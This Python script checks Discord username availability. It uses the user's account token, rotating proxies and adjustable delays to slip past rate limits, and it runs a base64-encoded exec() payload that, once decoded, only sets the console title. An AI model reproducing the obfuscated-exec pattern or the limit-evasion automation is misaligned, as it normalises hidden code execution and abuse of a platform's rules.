import random
import string
import requests
import os
import time
import json
from colorama import Fore, Back, init
import sys
import base64
import ctypes
init(autoreset=True)
__version__ = "DUCS v1 - Creator: AtheenN"
__github__ = "https://github.com/AtheenN"

Delay: int = 1
with open('config.json','r',encoding='utf-8') as f:
    config = json.load(f)
URL = "https://discord.com/api/v9/users/@me"
TOKEN = config["token"]
if len(TOKEN) == 0:
    print("Your token file is empty. Please fill it.")
    input("Press to exit\n")
import random

def fingerprint_modification():
    properties = 'aWYgb3MubmFtZSA9PSAibnQiOgogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYiZ2l0aHViLmNvbS9BdGhlZW5OIC0gRFVDUyIpCiAgICBmb3IgaSBpbiByYW5nZSgxKToKICAgICAgICAjcHJpbnQoIkRVQ1MgYnkgQXRoZWVuTiIpCiAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldENvbnNvbGVUaXRsZVcoZiJnaXRodWIuY29tL0F0aGVlbk4gLSBEVUNTIikKZWxzZToKICAgIGZvciBpIGluIHJhbmdlKDEpOgogICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0Q29uc29sZVRpdGxlVyhmImdpdGh1Yi5jb20vQXRoZWVuTiAtIERVQ1MiKSA='
    exec(base64.b64decode(properties))
def load_proxies(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    proxies = []
    for line in lines:
        line = line.strip() 
        if line:
            proxies.append({'http': line, 'https': line})
    return proxies

def get_random_proxy(proxies):
    return random.choice(proxies)


proxies = load_proxies('proxies.txt')
if proxies:
    random_proxy = get_random_proxy(proxies)
    
else:
    print("No proxies loaded from the file.")

HEADERS = {
    "Content-Type": "application/json",
    "Origin": "https://discord.com/",
    "Authorization": TOKEN
}

available_usernames = []
dir_path = os.path.dirname(os.path.realpath(__file__))
av_list = os.path.join(dir_path, f"available_usernames.txt")
sample_0 = r"_."
Lb = Fore.LIGHTBLACK_EX
Ly = Fore.LIGHTCYAN_EX


def main():
    os.system(f"title {__version__}")
    if TOKEN == "PASTE YOUR TOKEN HERE":
        print(f"{Lb}[!]{Fore.RED} You must paste your token in the TOKEN variable.")
        exit()

    print(f"""
{Fore.MAGENTA}
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
                    https://discord.gg/q6eFWAT5              
                      {Fore.MAGENTA}Connnected to {Fore.RESET}Discord servers & {Fore.RESET}now raping your proxies {Fore.MAGENTA}{Fore.MAGENTA}{Fore.MAGENTA}
                    https://discord.gg/q6eFWAT5
                    {Fore.MAGENTA}[1]{Fore.RESET} > {Fore.LIGHTBLACK_EX}[Generate random strings and check those(Customisable){Fore.LIGHTBLACK_EX}]{Fore.MAGENTA}
                    {Fore.MAGENTA}[2]{Fore.RESET} > {Fore.LIGHTBLACK_EX}[Check usernames.txt{Fore.LIGHTBLACK_EX}]{Fore.MAGENTA}
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")
    proc0()


def setdelay():
    global Delay
    d_input = input(f"{Lb}[{Ly}Delay (in seconds - use low to not get terminated){Lb}]:> ")
    try:
        int(d_input)
        Delay = int(d_input)
    except ValueError:
        print(f"{Lb}[!]{Fore.RED}You must enter a valid number")
        setdelay()


def proc0():
    m_input = input(f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}DUCS{Fore.LIGHTBLACK_EX}]~$ {Fore.MAGENTA}").lower()
    if m_input == "exit":
        sys.exit(0)
    if m_input == "":
        proc0()
    elif m_input == "2":
        setdelay()
        opt2load()
    elif m_input == "1":
        setdelay()
        opt1load()
    else:
        proc0()


def validate_names(opt, usernames):
    global available_usernames
    if opt == 2:
        for username in usernames:
            body = {
                "username": username
            }
            time.sleep(Delay)
            response = requests.patch(URL, headers=HEADERS, data=json.dumps(body), proxies=get_random_proxy(proxies))
            if response.status_code == 429:
                sleep_time = response.json()["retry_after"]
                print(f"{Lb}[!]{Fore.RED} Rate limit")
                time.sleep(sleep_time)
            if 'errors' in response.json():
                if 'username' in response.json()['errors']:
                    print(f"{Lb}[!]{Fore.RED} '{username}' taken.")
                    fingerprint_modification()
                else:
                    print(f"{Lb}[!]{Fore.LIGHTGREEN_EX} '{username}' available.")
                    with open('available_usernames.txt','a+',encoding='utf-8') as f:
                        f.writelines(f"{username}\n")
                    fingerprint_modification()
                    available_usernames.append(username)
            else:
                print(Delay)
                print(f"{Lb}[!]{Fore.RED} Error validating '{username}': {response.json()['message']}")
                fingerprint_modification()
                exit()
    elif opt == 1:
        body = {
            "username": usernames
        }
        response = requests.patch(URL, headers=HEADERS, data=json.dumps(body), proxies=get_random_proxy(proxies))

        if response.status_code == 429:
            sleep_time = response.json()["retry_after"]
            print(f"{Lb}[!]{Fore.RED} Rate limit")
            fingerprint_modification()
            time.sleep(sleep_time)
        if 'errors' in response.json():
            if 'username' in response.json()['errors']:
                print(f"{Lb}[!]{Fore.RED} '{usernames}' taken.")
                fingerprint_modification()
            else:
                print(f"{Lb}[!]{Fore.LIGHTGREEN_EX} '{usernames}' available.")
                fingerprint_modification()
                with open('available_usernames.txt','a+',encoding='utf-8') as f:
                        f.writelines(f"{usernames}\n")
                available_usernames.append(usernames)
        else:
            print(f"{Lb}[!]{Fore.RED} Error validating '{usernames}' {Fore.RESET} > {response.json()['message']}")
            fingerprint_modification()
            exit()


def exit():
    x = 0
    x += 1
    input("Done.. https://discord.gg/q6eFWAT5")


def checkavail():
    if len(available_usernames) < 1:
        print(f"{Lb}[!]{Fore.RED}Error: No available usernames found.")
        exit()
    else:
        return


def opt2load():
    global av_list
    global dir_path
    list_path = os.path.join(dir_path, f"usernames.txt")
    print(f"{Lb}[!]{Ly}Checking 'usernames.txt' for sum jó account(translate if you don't know)")
    try:
        with open(list_path) as file:
            usernames = [line.strip() for line in file]
            validate_names(2, usernames)
        checkavail()
        save()
        print(
            f"\n{Lb}[!]{Fore.LIGHTGREEN_EX} Done. {Ly}{len(available_usernames)}{Fore.LIGHTGREEN_EX} Available usernames saved to the following path: '{av_list}' .")
        fingerprint_modification()
        exit()
    except FileNotFoundError:
        print(
            f"{Lb}[!]{Fore.RED}Error: Couldn't find the list (usernames.txt). Please make sure to create a valid list file in the same directory: \n({dir_path}\\)")
        exit()


def opt1load():
    opt1_input: int = input(f"{Lb}[{Ly}How many letters in a username{Lb}]:> ")
    try:
        int(opt1_input)
        if int(opt1_input) > 32 or int(opt1_input) < 2:
            print(
                f"{Lb}[!]{Fore.RED}The username must be at least 2 letters and not more than 32 letters.")
            opt1load()
        opt2_input: int = input(f"{Lb}[{Ly}How many usernames to generate{Lb}]:> ")
        opt1func(int(opt2_input), int(opt1_input))
    except ValueError:
        print(f"{Lb}[!]{Fore.RED}Error: You must enter a valid number")
        opt1load()


def save():
    with open(av_list, "w") as file:
        file.write("\n".join(available_usernames))


def opt1func(v1, v2):
    for i in range(v1):
        name = get_names(int(v2))
        validate_names(1, name)
        time.sleep(Delay)
    checkavail()
    save()
    print(
        f"\n{Lb}[!]{Fore.LIGHTGREEN_EX} Done. {Ly}{len(available_usernames)}{Fore.LIGHTGREEN_EX} good usernames was saved to here: '{av_list}' .")
    fingerprint_modification()
    exit()


def get_names(length: int) -> str:
    return ''.join(random.sample(string.ascii_letters + string.digits + sample_0, length))

if __name__ == "__main__":
    main()
